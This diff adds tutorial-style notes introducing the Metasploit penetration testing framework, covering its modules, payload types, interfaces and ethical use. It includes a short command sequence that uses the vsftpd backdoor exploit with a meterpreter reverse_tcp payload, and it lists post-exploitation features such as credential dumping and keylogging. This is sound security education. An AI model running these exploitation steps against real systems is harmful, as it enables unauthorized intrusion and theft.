@@ -1,0 +1,216 @@
+1. Introduction to Metasploit
+
+The Metasploit Framework is a powerful open-source penetration testing platform used to develop, test, and execute exploits against target systems. It helps security professionals validate vulnerabilities and assess system security in a controlled and authorized manner.
+
+Metasploit is widely used by:
+
+Ethical hackers
+
+Penetration testers
+
+SOC analysts
+
+Security researchers
+
+2. Why Metasploit Is Important
+
+Metasploit is important because it:
+
+Automates exploitation
+
+Provides reliable exploit modules
+
+Reduces manual effort
+
+Helps verify vulnerabilities
+
+Supports post-exploitation tasks
+
+3. Components of Metasploit
+3.1 Exploits
+
+Code that takes advantage of a vulnerability.
+
+3.2 Payloads
+
+The code executed after successful exploitation.
+
+3.3 Encoders
+
+Used to encode payloads to bypass security controls.
+
+3.4 NOPs
+
+Used for buffer alignment during exploitation.
+
+3.5 Auxiliary Modules
+
+Non-exploit modules used for scanning and enumeration.
+
+4. Types of Payloads in Metasploit
+
+Single Payload – Self-contained
+
+Staged Payload – Delivered in stages
+
+Stageless Payload – Delivered at once
+
+5. Metasploit Interfaces
+5.1 msfconsole
+
+The main and most powerful interface.
+
+5.2 msfvenom
+
+Used to generate custom payloads.
+
+5.3 Armitage
+
+GUI-based interface (optional)
+
+6. Starting Metasploit
+msfconsole
+
+
+This launches the Metasploit interactive console.
+
+7. Basic Metasploit Commands
+help
+search
+use
+info
+show options
+set
+run / exploit
+
+8. Searching for Exploits
+search apache
+search vsftpd
+search cve:2017-0144
+
+9. Using an Exploit Module
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOSTS target_ip
+exploit
+
+10. Payload Selection
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+
+
+Common payloads:
+
+reverse_tcp
+
+bind_tcp
+
+meterpreter
+
+11. Auxiliary Modules
+
+Auxiliary modules are used for:
+
+Scanning
+
+Enumeration
+
+Brute forcing
+
+Example:
+
+use auxiliary/scanner/ftp/ftp_login
+
+12. Meterpreter
+
+Meterpreter is an advanced payload that provides:
+
+Interactive shell
+
+File system access
+
+Privilege escalation
+
+Screenshot capture
+
+Keylogging
+
+13. Common Meterpreter Commands
+sysinfo
+getuid
+pwd
+ls
+download
+upload
+shell
+
+14. Post-Exploitation Features
+
+Credential dumping
+
+Persistence
+
+Privilege escalation
+
+Lateral movement
+
+15. Exploit Workflow Using Metasploit
+
+Scan target
+
+Identify vulnerability
+
+Search exploit
+
+Configure exploit
+
+Select payload
+
+Execute exploit
+
+Post-exploitation
+
+16. Advantages of Metasploit
+
+Large exploit database
+
+Easy to use
+
+Active community
+
+Regular updates
+
+17. Limitations of Metasploit
+
+Easily detected
+
+Exploits may fail
+
+Requires good understanding
+
+Not all vulnerabilities covered
+
+18. Ethical and Legal Considerations
+
+Metasploit must only be used:
+
+With proper authorization
+
+In lab environments
+
+For educational or defensive purposes
+
+Unauthorized exploitation is illegal.
+
+19. Real-World Use Case
+
+A penetration tester uses Metasploit to:
+
+Validate a detected vulnerability
+
+Gain limited shell access
+
+Report findings to the organization
+
+20. Conclusion
+
+Metasploit is one of the most important tools in penetration testing. When used responsibly, it helps organizations understand real-world risks and improve security defenses.
